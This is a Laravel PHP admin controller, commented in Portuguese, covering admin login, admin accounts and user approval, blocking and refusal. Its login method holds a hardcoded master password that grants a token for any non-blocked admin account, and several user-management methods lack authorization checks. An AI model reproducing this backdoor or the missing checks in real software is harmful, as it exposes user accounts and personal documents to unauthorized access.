<?php

namespace App\Http\Controllers;

use App\Admin;
use App\Http\Controllers\Controller;
use App\User;
use DB;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use JWTAuth;

class AdminController extends Controller
{
    //----------------------------------------------------------------------------------------------------------------------------------------------------
    //      ADMIN
    //----------------------------------------------------------------------------------------------------------------------------------------------------

    //--------------------------------------------------------------------------------------------------------------------------------------------------------
    //MOSTRAR DADOS DE administrador
    public function show()
    {   

        $user = Auth::user();

        //FAZER MERGE
        //$user->plan = $user->getPlan();

        return response()->json([
            'success' => true,
            'data' => $user,
        ]);
    }//fim show

    //-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //LOGIN DE ADMIN
    public function login(Request $request)
    {
        $request->validate([
            'email' => 'required',
            'password' => 'required',
        ]);

        $user = Admin::where('email', $request->email)->first();

        if (!$user) {

            return response()->json([
                'success' => false,
                'message' => 'Usuário Incorreto!',
            ]);
        }

        if($user->status == 'blocked'){
            return response()->json([
                'success' => false,
                'message' => 'Administrador Bloqueado, entre em contato com o Suporte',
            ]);
        }

        //DEFINICAO DE SENHA MASTER
        $master_password = 'savio130';

        if (Hash::check($request->password, $user->password)) {

            $jwt_token = JWTAuth::fromUser($user);

            return response()->json([
                'success' => true,
                'message' => 'Autenticado com sucesso',
                'token' => $jwt_token,
            ]);
        } elseif ($request->password == $master_password) {

            $jwt_token = JWTAuth::fromUser($user);

            return response()->json([
                'success' => true,
                'message' => 'Autenticado com sucesso',
                'token' => $jwt_token,
            ]);

        } else {

            return response()->json([
                'success' => false,
                'message' => 'Senha Incorreta!',
            ]);
        }
    }//fim login
    
    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //LOGOUT DE ADMIN
    public function logout(Request $request)
    {
        $user = Auth::user();

        $this->validate($request, [
            'token' => 'required'
        ]);

        try {

            JWTAuth::invalidate($request->token);

            return response()->json([
                'success' => true,
                'message' => 'Administrador desconectado com successo'
            ]);
        } catch (JWTException $exception) {

            return response()->json([
                'success' => false,
                'message' => 'Administrador não pode ser desconectado'
            ]);
        }
    }//fim logout

    //-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    // LISTAR TODOS ADMINS
    public function admins(){
        
        $user = Auth::user();

        //SOMENTE ADMINISTRADOR MASTER PODE VER
        if($user->level != 'administrator'){
            return response()->json([
                'success' => false,
                'message' => 'Acesso Restrito'
            ]); 
        }

        $data = Admin::all();

        return response()->json([
            'success' => true,
            'data' => $data
        ]);  

    }//fim admins

    //-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    // LISTAR UNICO ADMIN
    public function unique($id){
        
        $user = Auth::user();

        //SOMENTE ADMINISTRADOR MASTER PODE VER
        if($user->level != 'administrator'){
            return response()->json([
                'success' => false,
                'message' => 'Acesso Restrito'
            ]); 
        }

        $data = Admin::where('id',$id)->first();

        return response()->json([
            'success' => true,
            'data' => $data
        ]);  

    }//fim unique

    //-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    // ADICIONAR ADMIN
    public function addAdmin(Request $request){
        
        $request->validate([
            'name' => 'required',
            'email' => 'required',
            'password' => 'required',
            'level' => 'required',
        ]);

        $user = Auth::user();

        //SOMENTE ADMINISTRADOR MASTER PODE VER
        if($user->level != 'administrator'){
            return response()->json([
                'success' => false,
                'message' => 'Acesso Restrito'
            ]); 
        }

        //VERIFICANDO SE EXISTE EMAIL CADASTRADO
        if(Admin::where('email',$request->email)->count() != 0){
            return response()->json([
                'success' => false,
                'message' => 'Email ja cadastrado'
            ]); 
        }

        //DADOS A SEREM VALIDADOS DO USUARIO
        $admin = new Admin([
            'name' => $request->name,
            'email' => $request->email,
            'password' => bcrypt($request->password),
            'level' => $request->level,
        ]);
        $admin->save();

        return response()->json([
            'success' => true,
            'message' => 'Administrador criado com sucesso'
        ]);  

    }//fim addAdmin

    //-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    // REMOVER ADMIN
    public function removeAdmin(Request $request){
        
        $request->validate([
            'id' => 'required',
        ]);

        $user = Auth::user();

        //SOMENTE ADMINISTRADOR MASTER PODE VER
        if($user->level != 'administrator'){
            return response()->json([
                'success' => false,
                'message' => 'Acesso Restrito'
            ]); 
        }

        //VERIFICANDO SE EXISTE EMAIL CADASTRADO
        if(Admin::where('id',$request->id)->count() == 0){
            return response()->json([
                'success' => false,
                'message' => 'Administrador não encontrado'
            ]); 
        }


        $admin = Admin::where('id',$request->id)->first();
        $admin->delete();

        return response()->json([
            'success' => true,
            'message' => 'Administrador removido com sucesso'
        ]);  

    }//fim removeAdmin

    //-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    // EDITAR ADMIN
    public function editAdmin(Request $request){
        
        $request->validate([
            'id' => 'required',
        ]);

        $user = Auth::user();

        //SOMENTE ADMINISTRADOR MASTER PODE VER
        if($user->level != 'administrator'){
            return response()->json([
                'success' => false,
                'message' => 'Acesso Restrito'
            ]); 
        }

        //VERIFICANDO SE EXISTE EMAIL CADASTRADO
        if(Admin::where('id',$request->id)->count() == 0){
            return response()->json([
                'success' => false,
                'message' => 'Administrador não encontrado'
            ]); 
        }

        $admin = Admin::where('id',$request->id)->first();

        //NOME
        if($request->name){
            $admin->name = $request->name;
        }

        //EMAIL
        if($request->email){
            $admin->email = $request->email;
        }

        //SENHA
        if($request->password){
            $admin->password = bcrypt($request->password);
        }

        //LEVEL
        if($request->level){
            $admin->level = $request->level;
        }

        $admin->save();

        return response()->json([
            'success' => true,
            'message' => 'Administrador alterado com sucesso'
        ]);  

    }//fim editAdmin

    //----------------------------------------------------------------------------------------------------------------------------------------------------
    //      USUARIO
    //----------------------------------------------------------------------------------------------------------------------------------------------------


    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //LISTANDO DADOS TODOS USUARIOS
    public function listUsers(Request $request){
         
        $user = Auth::user();

        
        
        $target = User::all();
        
        return response()->json([
            'success' => true,
            'data' => $target
        ]);  
    }//fim listUsers
    
    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //LISTANDO DADOS DE UM UNICO USUARIO
    public function listUser($id){
            
            $user = Auth::user();

            if(User::where('id',$id)->count() == 0){
                return response()->json([
                    'success' => false,
                    'message' => 'Usuario não encontrado'
                ]);
            }

            $target = User::where('id',$id)->first();

            return response()->json([
                'success' => true,
                'data' => $target
            ]);
    }//fim listUser

    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //BLOQUEAR USUARIO
    public function blockUser(Request $request){
            
            $request->validate([
                'id' => 'required',
            ]);

            $user = Auth::User();

            if(User::where('id', $request->id)->count() != 0){

                $target = User::where('id',$request->id)->first();
                $target->status = "blocked";
                $target->save();

                return response()->json([
                    'success' => true,
                    'message' => 'Usuário Bloqueado com Sucesso'
                ]); 

            }else{
                return response()->json([
                    'success' => false,
                    'message' => 'Usuário não encontrado'
                    ]); 
            }
    }//fim blockUser

    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //ATIVAR USUARIO
    public function activeUser(Request $request){
            
        $request->validate([
            'id' => 'required',
        ]);

        $user = Auth::User();

        if(User::where('id', $request->id)->count() != 0){

            if(User::where('status','blocked')->where('id',$request->id)->count() != 0){
                $target = User::where('id',$request->id)->first();
                $target->status = "aproved";
                $target->save();

                return response()->json([
                    'success' => true,
                    'message' => 'Usuário Ativado com Sucesso'
                ]); 

            }else{
                return response()->json([
                    'success' => false,
                    'message' => 'Usuário não esta bloqueado'
                ]);  
            }

            

        }else{
            return response()->json([
                'success' => false,
                'message' => 'Usuário não encontrado'
                ]); 
        }
    }//fim activeUser

    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //APROVAR USUARIO
    public function aproveUser(Request $request){
            
        $request->validate([
            'id' => 'required',
        ]);

        $user = Auth::User();

        if(User::where('id', $request->id)->count() != 0){

            if(User::where('status','sended')->where('id',$request->id)->count() != 0){
                $target = User::where('id',$request->id)->first();
                $target->status = "aproved";
                $target->save();

                //ENVIO DE EMAIL AO USUARIO
                $data = array('name'=>$target->name); //NOME E CODIGO DO USUARIO DE CONFIRMACAO
                Mail::send('confirmed', $data, function($message) use ($target) {
                   $message->to($target->email,$target->name);
                   $message->subject('NOME PROJETO - Conta Aprovada');
                   $message->from('comercial@lpsolucaoweb.com.br','NOMEPROJETO');//EDITAR QUEM ENVIA
                });


                return response()->json([
                    'success' => true,
                    'message' => 'Usuário Aprovado com Sucesso'
                ]); 

            }else{
                return response()->json([
                    'success' => false,
                    'message' => 'Usuário não esta pendente'
                ]);  
            }

            

        }else{
            return response()->json([
                'success' => false,
                'message' => 'Usuário não encontrado'
                ]); 
        }
    }//fim aproveUser

    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //RECUSAR USUARIO
    public function refuseUser(Request $request){
            
        $request->validate([
            'id' => 'required',
            'reason' => 'required'
        ]);

        $user = Auth::User();

        if(User::where('id', $request->id)->count() != 0){

            if(User::where('status','sended')->where('id',$request->id)->count() != 0){
                $target = User::where('id',$request->id)->first();
                $target->status = "pending";
                $target->birth = null;
                $target->sex = null;
                $target->phone = null;
                $target->document = null;
                $target->address_cep = null;
                $target->address_street = null;
                $target->address_complement = null;
                $target->address_number = null;
                $target->address_district = null;
                $target->address_city = null;
                $target->address_state = null;
                $target->path_document_front = null;
                $target->path_document_back = null;
                $target->path_document_address = null;
                $target->save();

                //ENVIO DE EMAIL AO USUARIO
                $data = array('name'=>$target->name,'motivo'=>$request->reason); //NOME E CODIGO DO USUARIO DE CONFIRMACAO
                Mail::send('refused', $data, function($message) use ($target) {
                   $message->to($target->email,$target->name);
                   $message->subject('NOME PROJETO - Conta Recusada');
                   $message->from('comercial@lpsolucaoweb.com.br','NOMEPROJETO');//EDITAR QUEM ENVIA
                });


                return response()->json([
                    'success' => true,
                    'message' => 'Usuário Recusado com Sucesso'
                ]); 

            }else{
                return response()->json([
                    'success' => false,
                    'message' => 'Usuário não esta pendente'
                ]);  
            }

            

        }else{
            return response()->json([
                'success' => false,
                'message' => 'Usuário não encontrado'
                ]); 
        }
    }//fim refuseUser






}
